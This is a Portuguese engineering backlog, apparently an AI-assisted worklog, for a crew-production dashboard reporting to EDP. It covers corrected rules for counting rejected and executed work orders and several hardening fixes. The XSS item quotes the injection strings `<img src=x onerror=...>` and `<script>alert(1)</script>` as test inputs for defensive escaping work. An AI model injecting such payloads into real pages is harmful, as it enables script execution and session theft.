- **Evidência (13 equipes ECTSJ8x/9x, L0, 01→25/07):**
  - 2.100 notas concluídas distintas (dedup por UUID).
  - **787** delas têm registro em `note_rejections` (100% com `RejectedAt`).
  - O painel (`team_daily_subcat_totals`) mostra **1.732** → excluiu **368**.
  - Logo **419** notas com rejeição registrada **foram contadas como produção**,
    e 368 do mesmo tipo **não** foram. Mesma característica, tratamento diferente.
  - **Por quê:** `consolidateDay` aplica a regra com as rejeições CONHECIDAS
    naquele momento (+ enriquecimento via `note_rejections`). O coletor de
    rejeições roda de hora em hora e o sweep noturno só reprocessa D-1..D-7 —
    então rejeição coletada depois disso nunca é reavaliada. O resultado passa a
    depender do TIMING da coleta, não do fato.
  - **Ordem no tempo:** nas 787, o `RejectedAt` é ANTERIOR ao `conclusionDate` em
    100% dos casos → são notas rejeitadas e depois REFEITAS. (Hipótese provável
    do porquê não aparece o contrário: nota rejeitada DEPOIS de concluída sai do
    `Concluded[]` da WPA, então não entra nesta amostra. Não confirmado.)
- **Impacto:** ~24% da amostra (419 de 1.732) está num limbo de critério. Não é
  "para mais" nem "para menos" de forma sistemática — é **arbitrário**, e é
  número que vai pra EDP. Também explica parte da divergência com o levantamento
  manual (planilha: 1.824 executadas; painel: 1.732; concluídas cruas: 2.100).
- **REGRA DEFINIDA PELO JOSÉ (30/07/2026) — substitui a de 20/07:**
  > "Se uma nota é rejeitada, na maioria ela é REPROGRAMADA. A nota rejeitada
  > conta para a REJEIÇÃO da equipe que rejeitou. Quando ela for atribuída à
  > mesma equipe ou a OUTRA e essa equipe EXECUTAR, conta como nota EXECUTADA
  > também."
  - São **dois eventos independentes**, podendo ser de equipes diferentes:
    rejeição → conta pra quem rejeitou; execução → conta pra quem executou.
  - Portanto a exclusão cega "está em notasRejeitadas ⇒ não conta como
    executada" (regra 20/07) está **ERRADA** e suprime produção legítima.
  - O que ainda NÃO conta como executada: conclusão **seguida** de rejeição
    (`RejectedAt` > `conclusionDate`) — nesse caso o serviço foi recusado, e era
    esse o caso que a regra de 20/07 pretendia pegar. Ou seja: a regra passa a
    depender da ORDEM DOS EVENTOS, não da simples presença nas duas listas.
- **⚠️ MEDIÇÃO CORRIGIDA (31/07/2026) — a anterior estava ERRADA.** A primeira
  leitura dizia "+368 OS (+21%), painel subnotifica". Era artefato de dois
  defeitos do diagnóstico: (a) comparar MINUTOS (rejeição 1 min antes da
  conclusão virava "nota refeita") e (b) filtrar pelo dia do SNAPSHOT, o que
  incluía notas concluídas em junho. **Conclusão retirada.**
- **VALIDAÇÃO NO PORTAL DA EDP (2 notas, fonte autoritativa):**
  - `030009946354` — Rejeição 30/06 **12:27** · Fim do Trabalho 30/06 **12:27:59**
  - `030009957459` — Rejeição 01/07 **12:20** · Fim do Trabalho 01/07 **12:20:24**
  - Ambas com motivo **“1172 - Pix no WPA”**: o cliente pagou na hora, o corte
    NÃO foi executado. Rejeição e conclusão são **o mesmo evento** — a visita
    terminou em rejeição. Pela regra do José, isso conta como REJEIÇÃO, não como
    produção.
- **⚠️ PREVISÃO (31/07/2026) — ERRADA POR RÉGUA, mantida como registro.** Feita
  com `scripts/diag-impacto-reconsolidacao.js` na sua 1ª versão: previa
  **12.080 → 11.464 = −616 (−5,1%)** em julho 01→25 (tabela inteira: 21.711 →
  19.368 = −2.343). O apply NÃO confirmou. Causa: o script media o "depois" com
  `consolidateDay(D)` filtrado em `r.date === D` — **a mesma régua errada do
  P0-6**. Quem grava o valor final de D é o passe de **D+1**; a régua de D
  subconta ~5%, então o script previa uma queda que era, na verdade, o próprio
  viés da régua. Corrigido no mesmo dia (ambos os scripts passaram a usar D+1,
  igual `detectDrift`) + `scripts/verify-consolidacao.js` criado pra verificar.
- **⚠️ ESTE BLOCO É O 1º APPLY DO DIA. O NÚMERO FINAL ESTÁ NO P1-17 (item 10):**
  julho fechou em **14.998 → 14.064 = −934 (−6,2%)** (01→30, reportável) e junho
  em **13.082 → 13.764 = +682 (+5,2%)** — juntos, **−252 (−0,9%)**. Os −88 abaixo
  são só a 1ª de três passadas do dia.
- **✅ APLICADO (31/07/2026, julho 01→31) — medição direta, tabela antes × depois:**
  - **Reportável (whitelist): 15.005 → 14.917 = −88 OS (−0,6%)** no mês.
    01→25: 12.080 → 11.989. 26→31: praticamente inalterado.
  - Saldo pequeno porque são **duas forças opostas**: o P1-15 tira nota rejeitada
    (pra baixo) e a re-consolidação com a régua de D+1 **devolve** produção que o
    auto-reparo do P0-6 havia derrubado (pra cima) — visível em 21/07 (+6),
    24/07 (+7), 25/07 (+6), justo a janela danificada pelos sweeps de 24–25/07.
  - Quedas concentradas no começo do mês: 02/07 −14, 09/07 −13, 16/07 −28.
  - ✅ Os dias que ficaram **idênticos** neste 1º apply (26, 27, 28, 30/07) eram
    o sintoma do **P1-16** — a exclusão não alcançava a nota carregada de um dia
    anterior. No 2º apply eles caíram −11, −37, −82 e −84.
  - Resolve junto: P0-6 (dias 17–24/07 rebaixados pelos sweeps) e P1-14
    (vira-noite) no mesmo passe.
  - Backup `pg_dump -Fc` de 728M tirado 11:51, íntegro (`pg_restore --list`).
  - ⚠️ O dry-run carrega TAMBÉM o P1-14 (vira-noite), que desloca notas ENTRE
    dias e quase se anula no mês. Pra isolar o P1-15 puro, rodar com
    `RECONEXAO_MAX_GAP_MIN=0`.
  - **Junho e maio NÃO foram re-consolidados** — precisam de medição própria com
    a régua corrigida antes de qualquer decisão.
- **🪤 ARMADILHA DESCOBERTA NO APPLY: o último dia do intervalo não fica selado.**
  `consolidateDay(D)` apaga {D-1, D}; logo, num backfill crescente, cada dia é
  reescrito pelo passe do dia seguinte — **menos o último**, que fica com a régua
  de D (subcontado). Se o fim do intervalo é hoje, o cron das 00:15 sela sozinho;
  se é passado, rodar com 1 dia extra no fim. O `backfill-consolidate` agora
  avisa isso ao terminar.
- **❌ MEDIÇÕES DESCARTADAS (não usar):** as estimativas por extração de snapshot
  (“+368 / +21%”, depois “509 / +42%” em L0, depois “+1.257 jul / −693 jun /
  +3.232 mai”) eram incomparáveis com o painel por dois motivos: atribuíam o dia
  pela data de conclusão (o painel usa `_notaDate`, que joga vira-noite pro dia
  de início do turno) e ignoravam que o painel inclui equipes-fantasma do `_acc`
  (ausentes dos snapshots). O sinal invertendo entre meses foi o que expôs o
  problema. Lição: medir SEMPRE pela própria consolidação em dryRun.
- **CONSEQUÊNCIA MEDIDA (L0, 13 equipes SJC, notas com conclusão em 01→25/07):**
  - 1.957 notas concluídas no período; **734** têm rejeição no MESMO dia
    (visita que terminou em rejeição → não é produção).
  - Produção correta pela regra = **1.223**. O painel mostra **1.732**.
  - Ou seja o painel excluiu só 225 das 734 e **contou 509 como produção**
    → **superestima em 509 (+42% sobre o correto)** nesta amostra.
  - Mesma situação, dois tratamentos → o problema é a INCONSISTÊNCIA.
- **MECANISMO PROVÁVEL (a confirmar no código):** a WPA limpa `notasRejeitadas`
  do payload após algumas horas, então o último snapshot do dia pode já não ter
  a rejeição; o enriquecimento via `note_rejections` no `consolidateDay` casa por
  `session_date IN (D-1, D)` + equipe; e o sweep noturno só re-consolida quando
  `detectDrift` acusa desvio ACIMA do limiar (`max(5, 2%)`) — poucas rejeições
  tardias por dia ficam sob o limiar e nunca são reaplicadas, acumulando ao longo
  do mês.
- **Ação (depois da decisão):**
  1. Tornar a regra determinística e independente do timing da coleta (aplicar
     sobre o estado FINAL da nota, não sobre o que estava no banco naquele dia).
  2. Função pura + teste cobrindo: nunca rejeitada, rejeitada→refeita,
     concluída→rejeitada, múltiplas rejeições.
  3. Dry-run do `backfill-consolidate` medindo o impacto por dia/equipe, revisar
     com o José, só então aplicar.
- **Aceite:**
  - [ ] Regra escrita e aprovada por escrito (vai pra EDP).
  - [ ] Duas notas de exemplo conferidas no portal WPA (fonte autoritativa).
  - [ ] Reconsolidação medida antes de aplicar; painel = regra em 100% da amostra.
- **Esforço:** 1 dia (após a decisão).
- **Rollback:** re-consolidar de volta (dry-run guarda o antes).
- **Relacionado:** regra de 20/07 (`project-regra-rejeitada-vs-concluida`),
  P0-6, P1-14. ⚠️ Nesta apuração 4 diagnósticos meus deram falso positivo antes
  de chegar aqui — validar QUALQUER número novo com 2 caminhos independentes.
- **31/07 (tarde):** a regra foi reformulada pelo José de forma mais estrita e
  revelou que a exclusão estava com a CHAVE ERRADA → ver **P1-16**.

---

## P1-16 — Exclusão de rejeitada casava pelo dia da SESSÃO, não pelo da NOTA

- **Categoria:** Dados (produção reportada à EDP)
- **Status:** **código done** (31/07/2026) — falta medir o impacto e re-consolidar
- **REGRA (José, 31/07/2026) — é ESTA que manda, supera a de 20/07 e detalha a de 30/07:**
  > "Uma visita de uma equipe a uma nota não pode contar como executada por si
  > só; a nota deve ser contada como executada quando for finalizada pela equipe.
  > Se uma equipe vai a uma nota e essa nota é rejeitada, ela deve contar somente
  > como rejeitada para essa equipe. Nos casos em que uma nota é rejeitada por uma
  > equipe (e conta como rejeitada para ela) e essa nota for reprogramada, quando
  > a equipe (seja ela a mesma ou outra) retornar para executar a nota e ela
  > finalizar a nota 100%, ela vai contar como executada somente para a equipe que
  > finalizou ela 100%."
  - Operacionalizada como: rejeição no MESMO dia da conclusão → não é produção;
    DEPOIS → não é produção; ANTES → é produção de quem concluiu. Comparação por
    DIA, não por minuto (a validação no portal mostrou rejeição no mesmo minuto do
    "Fim do Trabalho", motivo "1172 - Pix no WPA").
- **Evidência (reproduzida direto nas funções puras, 31/07):**
  ```
  nota X: concluída sexta 03/07, REJEITADA pela ECTSJ80 na sexta
  sessão de segunda 06/07 da ECTSJ80 ainda carrega X nas concluídas
  chave procurada pelo enrich: 2026-07-06|ECTSJ80   (dia da SESSÃO)
  chave gravada na rejeição:   2026-07-03|ECTSJ80   (dia da NOTA)
  → não casa → X conta como EXECUTADA, lançada em 03/07
  ```
  - A WPA carrega as concluídas **acumuladas** em cada sessão, então toda nota
    reaparece nos passes dos dias seguintes.
  - Agravante: `consolidateDay` grava linhas de dias anteriores **sem wipá-los**
    → o valor inflado **sobrescreve** o dia já correto.
  - Além disso o enrich só buscava `session_date IN (D-1, D)`: mesmo com a chave
    certa, rejeição mais antiga não era carregada.
- **Impacto:** é a **origem medida do P0-7** — tabela acima da régua em 5 dias,
  **4 deles sexta-feira** (03, 10, 17, 24/07), justamente os dias cuja produção
  passa de novo nas sessões de sábado e segunda. Explica também por que o apply
  de julho mexeu tão pouco (−88 OS): o P1-15 corrigia a chave `Date × string`,
  mas a chave em si era do conceito errado.
- **Ação:**
  1. ✅ `_rejIndexByNote(rejRows)` — índice `note_id|team_name` → dias de rejeição,
     usando `rejection_date` (o RejectedAt da WPA) com fallback pra `session_date`.
  2. ✅ `_contaComoExecutada(diasRejeicao, notaDate)` — a regra como função pura.
  3. ✅ 2ª passada no `consolidateDay`: busca rejeições **pelos note_id das
     concluídas** (sem janela de data) e injeta em `notasRejeitadas` quando a
     regra reprova. Injeta em vez de mudar a agregação **de propósito**, pra que
     `_aggregateTeamDailyTotals` e `upsertSubcatTotals` apliquem a MESMA regra —
     caminhos separados fariam a aba de tipos divergir da de subcategorias.
  4. ✅ `test/regraExecutadaRejeitada.test.js` (16 casos) — cada frase da regra
     virou teste, incluindo o vazamento sexta→segunda e "A rejeita, B finaliza".
  5. ✅ **Medido** antes de aplicar: reportável de julho **14.956 → 14.226 =
     −730 (−4,9%)**, com 100 a 490 notas re-somadas por passe (evento
     `consolidate_rejeicao_por_nota`). Os dias que o apply da manhã não havia
     movido — 28/07 e 30/07 — apareceram aqui com −82 e −84, confirmando o
     mecanismo.
  6. ✅ **Aplicado** em 31/07 (`backfill-consolidate 2026-07-01 2026-07-31
     --apply`, backup de 728M às 12:44). Tabela inteira 26.315 → 23.877 (−2.438).
  7. ✅ **Verificado** — e é o que fecha o P0-7: as quatro sextas passaram de
     −56 / −96 / −117 / −84 para **+2 / +3 / +2 / +4**, todos os 31 dias `ok`.
     O `diag-impacto` colapsou de −730 pra **+114 (+0,8%)**, sem nenhum dia
     negativo — a tabela agora subconta de leve (direção conservadora, dentro do
     limiar). Provável causa do resíduo: passes de D+2 fazem upsert de linhas
     `(D, equipe, tipo)` com contagem parcial, sem wipar D. Não investigado a
     fundo — é pequeno (~4 OS/dia) e para o lado seguro.
- **Aceite:**
  - [x] `node --test` 343 → 357 verdes.
  - [x] Impacto medido por dia no recorte da whitelist, revisado com o José.
  - [x] `verify-consolidacao.js` sem drift negativo nas sextas após re-consolidar.
- **Esforço:** fix 1h + medição/apply/verificação ~30min (tudo feito).
- **Rollback:** reverter o commit (volta a contar visita rejeitada como produção)
  e re-consolidar o período.
- **Relacionado:** P1-15 (mesma linha de código, chave diferente), P0-7 (é o
  sintoma), P1-14 (`_effDate` é usado no cálculo do `notaDate` aqui).

---

# P2 — Média prioridade (2 meses)

## P2-1 — Testes de contrato de rota (login, scope, health)

- **Categoria:** Qualidade
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de qualidade + backend 2026-07-08
- **Evidência:** `test/` não tem nenhum arquivo cobrindo `routes/*.js`.
  Composição `compatRegionalParam → applyScope → handler` nunca é
  exercitada ponta a ponta.
- **Impacto:** Uma rota que esqueça o middleware `applyScope` vaza dados
  de outra regional silenciosamente. Nenhum teste hoje pegaria.
- **Ação:**
  1. Exportar `app` de `server.js` sem chamar `.listen()`. Chamar `listen(0)`
     no `before()` do teste (porta aleatória).
  2. Criar `test/routes.test.js` com `fetch` nativo do Node contra
     `http://127.0.0.1:${port}`.
  3. Cobrir:
     - `POST /api/auth/login` com credencial errada → 401
     - `POST /api/auth/login` OK → 200 com token
     - `GET /api/teams` sem token → 401
     - `GET /api/teams?regionals=SJC` com token GUA → 403 ou array
       filtrado só de GUA
     - `GET /health` → JSON válido (após P1-2)
- **Aceite:** 5+ testes de rota, todos verdes. ✓ (17 testes em `test/routes.test.js`)
- **Esforço:** 1-2 dias.
- **Rollback:** Trivial (testes novos).
- **Depende de:** P1-2.
- **Feito em:** 22/07/2026. `test/routes.test.js` (criado 14/07 como "adianta
  P2-1") já cobria login (401/200 + regionals[]/v=2), guard sem token, escopo
  regional (403 pra `?regionals` fora do token + recorte por regional), P0-5,
  SSRF (P1-4) e rate-limit (P1-5). Hoje fechei os 2 bullets literais que
  faltavam: **`GET /api/teams`** (sem token → 401; `?regionals=SJC` com token
  GUA → 403 via applyScope) e **`GET /health`** (JSON válido, shape
  `{ok,ts,db}`, invariante `status ⟺ ok` e `db:error ⟹ !ok`; robusto com e sem
  Postgres). Total: **17 testes de rota**, todos verdes. Suíte 249/249.

## P2-2 — Extrair matemática de buckets em módulo único

- **Categoria:** Dados
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de pipeline 2026-07-08 (admitido em comentário do
  próprio código).
- **Evidência:** `services/dataWriter.js:592-596` — comentário: "Mesma
  matemática do `_buildDiaSummary` (dataService.js)". Duas cópias da
  prioridade `concluida > rejeitada > andamento > atual` + cálculo de
  canceladas/entradas em `dataWriter.js:658-669` e `dataService.js:313-347`.
- **Impacto:** Mudança de regra num lugar e não no outro = histórico
  persistente (`team_daily_carteira`) divergindo do summary ao vivo.
  Bug de 11/06 (canc=904/294) foi exatamente disso.
- **Ação:**
  1. Criar `services/carteiraMath.js`:
     ```js
     module.exports = { classifyBuckets, computeSummary };
     // classifyBuckets(inicial:Set, atualRaw:Set, andamentoRaw:Set,
     //                 concluidasRaw:Set, rejeitadasRaw:Set) → {
     //   atual:Set, andamento:Set, concluidas:Set, rejeitadas:Set,
     //   canceladas:Set, entradas_novas:Set
     // }
     ```
  2. Refatorar `dataService.js:_buildDiaSummary` e `dataWriter.js:upsertTeamDailyCarteira`
     pra usar `classifyBuckets`.
  3. Criar `test/carteiraMath.test.js` (função pura, fixtures simples).
- **Aceite:** Um único ponto de mudança pra regra de bucket. Testes verdes. ✓
- **Esforço:** meio dia.
- **Rollback:** Reverter commit (função pura, sem efeito colateral).
- **Depende de:** P0-3 (testes cobrindo o comportamento atual antes de
  refatorar).
- **Feito em:** 22/07/2026.
  - Criado `services/bucketMath.js` com `classifyBuckets({inicial, atual,
    andamento, concluidas, rejeitadas})` → contagens `{inicial, atual,
    andamento, concluidas, rejeitadas, canceladas, entradas_novas}`. É a FONTE
    ÚNICA da prioridade `rejeitada > concluída > andamento > atual` + cálculo de
    canceladas/entradas. (Nome ficou `bucketMath`, não `carteiraMath` como o
    plano sugeria — mais descritivo do que faz.)
  - `dataService._buildDiaSummary` (ao vivo) e
    `dataWriter.upsertTeamDailyCarteira` (histórico) agora **chamam a mesma
    função** — a duplicata que causou o bug de 11/06 (canc 904 vs 294) sumiu.
    Comentários datados da prioridade (20/07, ECTSJ83) preservados nos dois
    call-sites.
  - **Comportamento preservado** (refactor mecânico): os testes existentes
    `diaSummary` e `dataWriter` — que assertam as contagens de saída — seguem
    verdes sem alteração. +13 testes novos em `test/bucketMath.test.js`
    (prioridade, dedup, canceladas/entradas, caso ECTSJ83, e a INVARIANTE
    `atual+andamento+concluidas+rejeitadas+canceladas = inicial + entradas_novas`
    em 5 cenários). Suíte 262/262.
  - **Correção de doc:** o comentário antigo em `dataService` afirmava a
    invariante `inicial = ... + entradas_novas` (imprecisa/errada — off por
    `entradas`); o correto (o que o código sempre fez) está documentado em
    `bucketMath.js` e travado em teste.
  - **Deploy:** só código (services), sem migração. `git pull` + PM2.

## P2-3 — `public/` dedicado (parar de servir raiz do repo)

- **Categoria:** Segurança / Frontend
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de backend + frontend + segurança 2026-07-08
- **Evidência:** `server.js:74` — `app.use(express.static(path.join(__dirname)))`
  serve raiz inteira: `server.js`, `services/*`, `ecosystem.config.js`,
  `logs/`, `CHECKPOINT.md`. `.env` protegido só pelo default `dotfiles:'ignore'`.
- **Impacto:** Qualquer pessoa na rede lê código-fonte, logs operacionais
  e detalhes de infra sem autenticação.
- **Ação:**
  1. Criar `public/` na raiz.
  2. Mover `index.html`, `vendor/`, `logo.*` pra `public/`.
  3. `server.js:74` → `app.use(express.static(path.join(__dirname, 'public')))`.
  4. `server.js:77` → `sendFile(path.join(__dirname, 'public', 'index.html'))`.
- **Aceite:**
  - [x] `curl http://localhost:3002/server.js` retorna 404. (travado em `test/routes.test.js`)
  - [x] `curl http://localhost:3002/logs/out.log` retorna 404.
  - [x] Painel continua funcionando normalmente. (`GET /` → 200 HTML, testado)
- **Esforço:** 1-2h.
- **Rollback:** Reverter commit (mover arquivos de volta).
- **Depende de:** nada, mas coordena bem com P3-2 (split do frontend).
- **Feito em:** 22/07/2026.
  - Criado `public/` e movidos (via `git mv`, preserva histórico):
    `index.html`, `vendor/`, `logo.png`, `logo.svg`. `server.js` agora faz
    `express.static(__dirname/'public')` (era `__dirname` inteiro) — a raiz do
    repo (server.js, services/, db/, logs/, migrations/, `.env`…) **deixou de
    ser servível por HTTP**. Assets do cliente usam caminhos relativos
    (`vendor/…`, `logo.png`) que resolvem do `public/`.
  - Catch-all endurecido: SPA-fallback só pra rotas SEM extensão; caminho COM
    extensão que não existe no `public/` retorna **404** (antes o `*` devolvia
    o HTML com 200 pra qualquer coisa — `/server.js` viraria 200-HTML). Assim
    `/server.js`, `/logs/*.log`, `/services/*.js` dão 404 de verdade.
  - +4 testes em `test/routes.test.js` (server.js/logs/services → 404; `/` →
    200 HTML). Suíte 266/266. CLAUDE.md atualizado (`public/index.html`,
    `public/vendor/`).
  - **Nota:** `vercel.json` (legado) ainda referencia `logo.png` na raiz —
    intocado de propósito (Vercel está sendo aposentado, P3-8/Fase 4; prod é
    VM/PM2). `Cabeçalho Engelmig Energia.png` (órfão) ficou na raiz e agora
    simplesmente não é mais servido.
  - **Deploy:** código + arquivos movidos, sem migração de dados. `git pull` +
    PM2. Após subir, confira: `curl -sI http://172.25.3.154:3002/server.js`
    deve dar `404`, e `curl -sI http://172.25.3.154:3002/` deve dar `200`.

## P2-4 — Escapar dados EDP em `innerHTML`

- **Categoria:** Segurança / Frontend
- **Status:** **done** (22/07/2026) — ver "Feito em" no fim do item.
- **Fonte:** Auditoria de segurança + frontend 2026-07-08
- **Evidência:** 133 usos de `innerHTML` em `index.html`. `escapeHtml`
  usado só 13 vezes e definido **em duplicidade** (`index.html:5862` e `:7327`).
  Dados da API WPA (endereço, nome de OS, comentário) entram crus. JWT em
  `localStorage` (`index.html:5406`) — XSS = roubo de sessão.
- **Impacto:** Dado da EDP contendo `<img src=x onerror=...>` executa JS.
  Baixa probabilidade (dados operacionais raramente têm markup), mas
  vetor real.
- **Ação:**
  1. Deletar uma das definições duplicadas de `escapeHtml`, deixar uma
     global no topo do `<script>`.
  2. Aplicar em pontos identificados como críticos:
     - `index.html:10618-10619` (nome/cargo de colaborador)
     - `index.html:10857-10871` (cliente.nome, endereco.logradouro, texto
       da OS)
     - `onclick` construídos com interpolação: usar `data-*` attributes +
       listener delegado (mata os `${...}` em atributo).
  3. Adicionar CSP restritivo em `server.js`:
     `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';`
     (unsafe-inline ainda necessário porque tem onclick inline; remover
     depois do P3-2).
- **Aceite:**
  - [x] `escapeHtml` definido 1 vez, usado em pontos críticos.
  - [x] Payload de teste com `<script>alert(1)</script>` no nome de OS
    renderiza como texto.
  - [x] Header CSP presente em resposta.
- **Esforço:** meio dia.
- **Rollback:** Reverter commit.
- **Depende de:** nada.
- **Feito em:** 22/07/2026.
  1. `escapeHtml` agora tem **1 única definição** (global hoisted em
     `index.html:7328`). A duplicata local do IIFE `MultiSelect` (antigo
     `:5862`) foi removida — os call-sites do IIFE (`refresh()`) resolvem pra
     global por hoisting + execução diferida (comentário no lugar explica).
  2. `escapeHtml()` aplicado nos pontos críticos de free-text da EDP:
     `nota.comentarios`; bloco cliente/endereço (nome, unidade, telefone,
     tensão, tarifa, logradouro, bairro, cidade, CEP); modal e histórico de
     colaborador (nome, cargo, matrícula); logradouro na aba Mapa; observação
     e `team_name` da rejeição. Coordenadas em `href` de mapa via
     `encodeURIComponent`. Total: 23 usos.
  3. **CSP + headers de segurança** em `server.js` (middleware após `cors()`).
     O CSP ficou **mais amplo** que o mínimo do plano original, de propósito,
     pra NÃO quebrar produção — libera só os hosts externos legítimos
     validados por grep: tiles Leaflet (`*.tile.openstreetmap.org` em
     `img-src`), proxy OSRM (`osrm-proxy.jose-zouain.workers.dev` em
     `connect-src`), e `data:` (ícones/logos base64 + fotos WPA em `img-src`).
     `'unsafe-inline'` em script/style continua necessário (onclick e estilos
     inline do monólito) — só remove depois do P3-2. Também setados
     `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`.
  - **Nota (dívida remanescente):** a ação (3) do plano — trocar `onclick`
    interpolado por `data-*` + listener delegado — **não** foi feita; é
    refactor grande do monólito e fica acoplada ao **P3-2**. O escaping cobre
    o vetor de dados; a CSP com `'unsafe-inline'` é o mitigador até lá.
  - **Deploy:** só código (`index.html` + `server.js`), sem migração. Após
    `git pull`, reiniciar PM2 (`delete + start`) e conferir o header CSP na
    resposta (`curl -sI https://<painel>/ | grep -i content-security`).

## P2-5 — Tie-breaker `.order('id')` em queries paginadas

- **Categoria:** Dados
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de dados 2026-07-08
- **Evidência:** `db/queries.js:236`, `:622`, `:954` — paginam sobre
  `captured_at` DESC apenas. `dataWriter.js:45` insere ~60 equipes num
  único INSERT (mesmo `captured_at`). Postgres não garante ordem estável
  em empates.
- **Impacto:** Fronteira de página cai dentro de grupo empatado → linhas
  duplicam/somem entre páginas. Bug não-reproduzível que mina confiança
  em exports.
- **Ação:** Adicionar `.order('id')` como tie-breaker nas 3 queries
  (`pgShim.js` já suporta múltiplos `.order()`).
- **Aceite:** 3 queries com tie-breaker; testes de paginação verdes.
- **Esforço:** 30min.
- **Rollback:** Reverter (ordem instável volta).
- **Depende de:** nada.
- **Feito em:** 22/07/2026.
  - **Escopo REVISADO na execução (maior que o do plano, de propósito).** Ao
    validar, o `.order()` das 3 queries de `snapshots` era só a ponta: das **16
    factories** que passam por `_selectAll`, **10** ou não tinham `.order()`
    nenhum (paginar com `.range()` sem `ORDER BY` = ordem arbitrária entre
    páginas no Postgres → mesma classe de bug) ou ordenavam só por `date`
    (não-única). Várias dessas alimentam **agregados reportados à EDP**
    (`team_daily_totals`), então eram tão ou mais críticas que as de snapshot.
    Corrigir só 3 deixaria a classe aberta — contra a filosofia "aritmética
    por construção". Não corrigi em silêncio: está aqui e no commit.
  - **Fix por construção:** o tie-breaker foi centralizado no próprio
    `_selectAll(queryFactory, pageSize=1000, tieBreaker='id')` — ele aplica
    `.order(tieBreaker)` como ÚLTIMA chave em TODA página, garantindo ordem
    total estável em todas as 16 paginações de uma vez. PKs auditadas em
    `supabase/schema.sql`: `snapshots`, `team_daily_totals`,
    `team_daily_subcat_totals`, `daily_totals`, `daily_subcat_totals` têm
    `id BIGSERIAL` (default). `note_rejections` tem PK `note_id` (UUID) → o
    caller passa `tieBreaker='note_id'`. `metas` não pagina via `_selectAll`.
  - **Testes:** `_selectAll` agora é **exportado** e `test/pagination.test.js`
    importa o REAL (antes copiava a impl — podia driftar). +5 testes: aplica
    `id` por página; tie-breaker é a última chave após a ordem do factory;
    `note_id` custom; `null` desliga; e paginação estável com `captured_at`
    todos iguais (2500 UUIDs, nenhum perde/duplica). Suíte: 222/222.
  - **Deploy:** só código (`db/queries.js`), sem migração. `git pull` + PM2.
    Risco de quebra contido: única forma de erro seria tabela sem `id`, e todas
    as paginadas foram auditadas (a única exceção, `note_rejections`, tem
    override). Rollback: reverter o commit.

## P2-6 — `statement_timeout` no pool Postgres

- **Categoria:** Dados
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de dados 2026-07-08
- **Evidência:** `services/pgShim.js:42-48` — pool configurado sem timeout.
  Query pesada em JSONB pode segurar as 10 conexões.
- **Impacto:** Range grande na aba Deslocamentos ou export mensal pode
  ocupar conexões por minutos. Enquanto isso, cron de escrita enfileira
  → painel trava em cascata.
- **Ação:** Adicionar `options: '-c statement_timeout=60000'` no `new Pool()`
  em `pgShim.js`.
- **Aceite:** Query travada > 60s aborta com erro (validar com
  `SELECT pg_sleep(70)` via psql).
- **Esforço:** 5min.
- **Rollback:** Trivial.
- **Depende de:** nada.
- **Feito em:** 22/07/2026.
  - Config do pool extraída pra `_buildPoolConfig(env)` (função PURA, testável
    sem banco) e `statement_timeout` aplicado via libpq `options`
    (`-c statement_timeout=<ms>`) — vale pra TODA conexão do pool desde o
    startup. Default **60000ms**, configurável por `PG_STATEMENT_TIMEOUT_MS`.
  - **Escape hatch:** `PG_STATEMENT_TIMEOUT_MS=0` desliga o limite (semântica
    do Postgres) — necessário pra scripts de backfill/reconsolidação que
    rodam queries longas de propósito e usam o mesmo pool. Documentado no
    jsdoc de `_buildPoolConfig`.
  - **Testes:** +5 em `test/pgShim.test.js` (default 60s presente; custom
    respeitado; 0 desliga; erro claro sem DATABASE_URL; max/idle/ssl). Suíte:
    227/227. Validação end-to-end (pg_sleep) fica como passo manual na VM
    (ver abaixo) — não dá pra testar timeout real sem banco.
  - **Validação na VM** (o `SET` local do psql NÃO reflete o pool da app; para
    provar o mecanismo do servidor, rode direto na conexão):
    `psql "$DATABASE_URL" -c "SET statement_timeout=2000; SELECT pg_sleep(5);"`
    → deve abortar com `canceling statement due to statement timeout`.
  - **Deploy:** só código (`services/pgShim.js`), sem migração. `git pull` +
    PM2. Rollback trivial (reverter o commit).

## P2-7 — Schema drift: `pg_dump --schema-only` no git

- **Categoria:** Ops / Dados
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de dados 2026-07-08
- **Evidência:**
  - `team_daily_carteira` é escrita (`dataWriter.js:682-685`) e lida
    (`routes/index.js:2671-2679`) mas **não tem CREATE TABLE em nenhum
    `.sql` do repo**.
  - `migrations/add_note_rejections.sql:23-25` define colunas
    `reason_codes/reason_labels/rejected_at` enquanto
    `supabase/migrations/008_note_rejections.sql:31-35` define
    `motivo_codes/motivo_textos/rejection_date` (o código usa este).
- **Impacto:** DR ou ambiente novo quebra silenciosamente. Schema real
  vive só na VM. Sem staging, isso é único ponto de falha.
- **Ação:**
  1. Na VM: `pg_dump -d wpa_monitor --schema-only > /tmp/schema.sql`
  2. Commitar como `db/schema-atual.sql` no repo (referência, não
     rodável direto — documenta o real).
  3. Deletar `migrations/add_note_rejections.sql` obsoleto.
  4. Escrever migration incremental `db/migrations/YYYYMMDD-team_daily_carteira.sql`
     com o CREATE TABLE correto (já existe em algum comentário do repo).
- **Aceite:**
  - [x] `db/schema-atual.sql` no git (commit `c7e023b`, 844 linhas, pg_dump da VM).
  - [x] Comparação revela todas as diferenças (documentada em `db/README.md`).
  - [x] Migração de `team_daily_carteira` versionada
    (`supabase/migrations/011_team_daily_carteira.sql`).
- **Esforço:** 2h.
- **Rollback:** Reverter commit.
- **Depende de:** P0-1 (senha `wpa_app` acessível — ou fazer com o próprio
  José antes do handoff).
- **Feito em:** 22/07/2026 (com o próprio José, satisfazendo a dependência P0-1).
  - **`db/schema-atual.sql`**: `pg_dump --schema-only` do banco vivo, commitado
    (844 linhas). Regeneração documentada em `db/README.md`.
  - **Drift auditado** (`db/schema-atual.sql` × `supabase/schema.sql`):
    - **ZERO drift de coluna** nas 11 tabelas compartilhadas — a base bate 1:1
      com o banco (inclui as críticas `snapshots`/`team_daily_totals`).
    - 6 tabelas só no banco (fora da base): `equipes_oficiais`,
      `notas_daily_agg`, `notas_snapshots`, `note_rejections`, `osrm_cache`,
      `team_daily_carteira`. As 5 primeiras têm migração de origem; a 6ª era a
      única **órfã** — agora versionada.
